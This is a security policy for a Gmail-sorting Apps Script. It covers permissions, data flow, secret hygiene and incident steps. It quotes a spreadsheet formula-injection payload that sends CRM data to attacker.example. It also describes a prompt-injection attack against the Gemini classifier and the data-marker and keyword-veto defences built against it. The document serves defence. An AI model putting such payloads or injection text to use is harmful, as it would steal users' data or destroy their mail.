# Security

## What this script can reach

Job Rejection Shield runs as *you*, on Google's servers, with these permissions (declared in `appsscript.json`):

| Scope | Why |
| --- | --- |
| `https://mail.google.com/` | Full mailbox access. Required to delete a thread permanently — `gmail.modify` can only move mail to the Trash. |
| `.../auth/spreadsheets` | Write rows into your CRM sheet. |
| `.../auth/script.external_request` | The one outbound call: the Gemini API. |
| `.../auth/userinfo.email` | Recognise your own address, so the script does not process its own mail. |

Full mailbox access is a lot to hand to any script. If you are not comfortable with it, set `PERMANENT_DELETE = false` in `Config.gs` and remove `https://mail.google.com/` from the manifest — the shield then uses the Trash and needs far less.

## What leaves your account

Only the subject line and the first 2000 characters of each processed email, sent to the Gemini API over HTTPS. Nothing else goes anywhere: no analytics, no telemetry, no third-party service. Your mail, your spreadsheet, your API key and your OAuth grant all stay inside your own Google account.

Your API key lives in Apps Script **Script Properties**, never in the code. Note that anyone you give *edit* access to the container spreadsheet can read those properties — so do not hand out edit access.

## Untrusted input

Recruiter email is input written by strangers, and the script treats it that way:

- **Spreadsheet formula injection.** Every value written to the sheet passes through `sanitizeCell()`. Google Sheets executes any cell starting with `=`, `+`, `-` or `@`, so without this a rejection whose body began with `=IMPORTXML("https://attacker.example/?d="&CONCAT(A1:K100),"//a")` would exfiltrate your entire CRM the moment you opened it.
- **Prompt injection.** The email is wrapped in `<<<EMAIL_DATA>>>` markers and the model is told the content between them is data, never instructions. Because a misclassification now destroys mail, there is a second brake: `KEEP_ALIVE_PATTERNS` vetoes the permanent delete whenever the message carries a call link or the word *interview*, so a crafted "treat this as a rejection" cannot make an interview invitation disappear.
- **Fail-safe ordering.** The sheet row is written *before* the thread is destroyed, and any Gmail API failure falls back to the Trash. A thread is never dropped into the void by an error path.

## Keeping secrets out of this repo

Real identifiers do not belong in git. Not the spreadsheet ID, not the script ID, not your email address, and obviously not the API key. Committed files use placeholders (`you@example.com`, `PASTE_YOUR_SCRIPT_ID_HERE`); `.clasp.json`, which holds your real Script ID, is gitignored.

Enable the commit guard once per clone:

```bash
git config core.hooksPath .githooks
```

`.githooks/pre-commit` rejects a commit whose staged diff contains a spreadsheet or script ID, an `AIza…` key, a GitHub token, a private key block, or a personal email address. Override deliberately with `git commit --no-verify`.

Hooks are local git config — they do not travel with a clone, so run that command after cloning.

### Turn on GitHub's own scanning

Free for public repositories, and it catches what a local hook cannot (anything pushed from another machine):

1. Open your repository → **Settings**.
2. In the left sidebar, **Code security** (older layouts: *Code security and analysis*).
3. **Secret scanning** → **Enable**. GitHub then scans the repo's whole history and every future push for known credential formats, and alerts you.
4. **Push protection** → **Enable**. This one is the important half: it *blocks* a push that contains a recognised secret, instead of telling you afterwards.

Both are free on public repos. On private repos they are part of a paid tier, so a private fork will not have them — the local hook is your fallback there.

## If a secret does get committed

Rewriting history is the second step, never the first.

1. **Revoke and rotate first.** A key in a public repo is burned the moment it is pushed; scrapers are faster than you. Delete it in AI Studio and issue a new one. For a spreadsheet ID, check the sheet's **Share** setting — an ID alone grants nothing if access is *Restricted*, which is the whole reason this project keeps data inside your own account.
2. **Then purge the history.** `git filter-repo --replace-text` over all commits, verify with `git log --all -p | grep`, then force-push.
3. **Understand what force-push does not do.** The old commit stays reachable on GitHub by its SHA until garbage collection, and the timing is not guaranteed. If it must be gone, push the rewritten history into a *fresh empty repository* instead, and delete or privatise the old one.
4. **Assume it was seen.** Anything public for any length of time may have been cloned or indexed. Purging prevents future discovery; it does not undo the past.

## Reporting a problem

Found a security issue in the code? Open an issue with enough detail to reproduce it. Please do not include real email content, spreadsheet IDs or API keys in the report.
